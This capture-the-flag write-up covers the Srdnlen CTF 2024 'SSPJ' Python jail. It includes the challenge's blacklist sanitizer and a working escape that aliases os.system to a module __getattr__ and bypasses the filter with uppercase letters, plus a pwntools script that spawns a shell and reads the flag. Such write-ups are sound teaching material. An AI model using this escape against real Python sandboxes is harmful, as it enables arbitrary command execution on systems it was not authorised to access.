# SSPJ (Super Secure Python Jail)

**CTF:** Srdnlen CTF 2024  

**Category:** Misc / PyJail

**Difficulty:** Medium

**Solves:** 52

**Author:** [@uNickz](https://github.com/uNickz) (Nicholas Meli)

---

## Description

> This SSPJ (Super Secure Python Jail) will drive you crazy!!
> 
> This is a remote challenge, you can connect to the service with: `nc sspj.challs.srdnlen.it 1717`

---

## Overview

<details>
<summary>Challenge Source Code</summary>

```py
import random

class SSPJ(object):
    def __init__(self):
        print("Welcome to the Super Secure Python Jail (SSPJ)!")
        print("You can run your code here, but be careful not to break the rules...")

        self.code = self.code_sanitizer(input("Enter your data: "))

        # I'm so confident in my SSPJ that 
        # I don't even need to delete any globals/builtins
        exec(self.code, globals())
        return

    def code_sanitizer(self, code: str) -> str:
        if not code.isascii():
            print("Alien material detected... Exiting.")
            exit()

        banned_chars = [
            # Why do you need these characters?
            "m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k"
        ]

        banned_digits = [
            # Why do you need these digits?
            "0", "7", "1"
        ]

        banned_symbols = [
            # You don't need these...
            ".", "(", "'", "=", "{", ":", "@", '"', "[", "`"
        ]

        banned_words = [
            # Oh no, you can't use these words!
            "globals", "breakpoint", "locals", "self", "system", "open",
            "eval", "import", "exec", "flag", "os", "subprocess", "input",
            "random", "builtins", "code_sanitizer"
        ]

        blacklist = banned_chars + banned_digits + banned_symbols + banned_words
        random.shuffle(blacklist)

        if any(map(lambda c: c in code, blacklist)):
            print("Are you trying to cheat me!? Emergency exit in progress.")
            exit()

        return code.lower()

if __name__ == "__main__":
    SSPJ()
```
</details>
<br />

Upon careful analysis, we can immediately observe several limitations placed on nearly all symbols, certain numbers, and specific letters and words.

- It is clear that the `code_sanitizer()` function normalizes all characters to lowercase using `code.lower()` before returning the code. This behavior allows us to bypass the character and word checks by utilizing the UPPERCASE equivalents of the restricted characters.

- Furthermore, while the available options are limited due to the absence of most symbols, one notable exception is the ability to freely use imports. This flexibility introduces the core vulnerability of the challenge.

---

## Exploitation

The key to exploiting this vulnerability lies in understanding how Python handles module imports.

### Importing a module: `from package import module`

When using the statement `from package import module`, Python follows a specific sequence of operations to locate and load the requested module. Below is the detailed process.

---

### Package Search

Python searches for the package (`package`) among the directories specified in `sys.path`, a list that contains the paths where Python looks for modules. These include:
- **The current directory** (if you're running a script).
- **System-specific directories**, such as those where Python is installed (e.g., `site-packages`).
- **Manually added paths** via operations like `sys.path.append()` or environment variables.

---

### Module Search

Once the package is located, Python searches for the requested module within the package. The module can be:
- **A Python file** (`module.py`).
- **A native module** written in C or a dynamic extension (e.g., `.so` on Unix systems or `.pyd` on Windows).
- **A subdirectory** (`module/`) containing an `__init__.py` file (which defines it as a module).

If Python doesn't find a match, it raises an `ImportError`.

---

### Module Loading

Once found, Python loads the module based on the following scenarios:
- **`.py` File**: It is compiled into bytecode (`.pyc` file) and then executed. If the `.pyc` file exists and is up to date, Python uses it directly.
- **C Module or Dynamic Extension**: It is loaded into memory via dynamic linking mechanisms.
- **Subdirectory with `__init__.py`**: The `__init__.py` file is executed to initialize the module, and the search process can continue recursively.

---

### Namespace Insertion

Once loaded, the module is added to the current context:
- With `from package import module`, Python directly imports `module` into the current namespace.
- This means you can access `module` without needing to refer to `package.module`.

---

### Module Caching in `sys.modules`

Python maintains a dictionary as a cache of all loaded modules in `sys.modules`. This system prevents repeatedly reloading the same modules, improving performance:
- When a module is requested, Python first checks `sys.modules`.
- If the module is already present, it uses the cached version without redoing the search, compilation, or loading.

---

### The `__main__` Module

The `__main__` module is special:
- When you run a Python script, its contents are immediately loaded and added to `sys.modules`.
- Each time you import from `__main__`, Python looks for the content in `sys.modules["__main__"]`.

---

### The `__getattr__` Function

The `from __main__ import something` directive can be manipulated to exploit the overloading of `__getattr__`:
- When you attempt to import a non-existent attribute from a module, Python calls the magic method `__getattr__` defined in the module itself via `sys.modules["__main__"].__getattr__("something")`.
- This behavior can be abused to execute arbitrary code.

---

## Solution

In our case, we overload the `__getattr__` function with the `system` function from the `os` module. By doing so, importing any string from the `__main__` module will result in the string being passed as an argument to the `system` function.

### Payload
```python
from os import system as __getattr__; from __main__ import sh
```

### Exploit

```py
#!/usr/bin/env python3

from pwn import *

io = remote("sspj.challs.srdnlen.it", 1717)

payload = "from os import system as __getattr__; from __main__ import sh"

# Bypass blacklist
for c in ["m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k", "g"]:
    if c in payload:
        payload = payload.replace(c, c.upper())

io.sendline(payload.encode())
time.sleep(1)
io.sendline(b"cat flag-*.txt")

io.interactive()
io.close()
```

## Flag

```
srdnlen{Cr4zY_Us3_0f_G3t4tTr_1n_PyTh0n_1nT3rN4lS}
```